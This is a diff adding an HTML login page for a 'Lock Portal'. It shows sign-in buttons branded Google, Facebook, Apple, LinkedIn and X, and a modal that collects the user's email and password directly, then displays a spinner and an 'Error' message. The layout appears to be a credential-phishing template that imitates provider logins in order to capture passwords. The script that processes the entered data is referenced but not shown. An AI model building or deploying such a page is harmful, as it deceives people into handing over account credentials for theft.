@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lock Portal Login</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-box">
+      <div class="login-title">
+      <img src="img/lockportal.png" >
+      <h1>Lock Portal™</h1>
+      <br>
+      <p>Please confirm your identity for access</p>
+      </div>
+
+      <form action="#" method="post">
+        <div class="social-buttons">
+          <button class="social-btn google">
+            <img src="social/google.png" alt="Google" class="social-logo google"> Sign in with Google
+          </button>
+          <button class="social-btn facebook">
+            <img src="social/facebook.png" alt="Facebook" class="social-logo facebook"> Sign in with Facebook
+          </button>
+          <button class="social-btn apple">
+            <img src="social/apple.png" alt="Apple" class="social-logo apple"> Sign in with Apple
+          </button>
+          <button class="social-btn linkedin">
+            <img src="social/linkedin.png" alt="LinkedIn" class="social-logo linkedin"> Sign in with LinkedIn
+          </button>
+          <button class="social-btn x">
+            <img src="social/x.png" alt="X" class="social-logo x"> Sign in with X
+          </button>
+        </div>
+      </form>
+
+      <div class="login-footer">
+      <p>Lock Portal™</p>
+      <a href="privacy-policy.html">Privacy Policy</a>
+      <a href="terms-of-service.html">Terms of Service</a>
+      </div>
+
+    </div>
+
+  </div>
+
+  <!-- Email and Password Modal -->
+  <div id="login-modal" class="modal">
+    <div class="modal-content">
+      <span class="close-btn" id="close-modal">&times;</span>
+      <form id="login-form">
+        <img id="login-img" src="" >
+        <div class="input-group">
+          <label for="username">Email</label>
+          <input type="email" id="email" placeholder="Enter email" required>
+        </div>
+        <div class="input-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" placeholder="Enter password" required>
+        </div>
+        <button type="submit" class="login-btn">Login</button>
+        <div class="feedback-container">
+          <div id="spinner"></div>
+          <p id="error-msg">Error</p>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
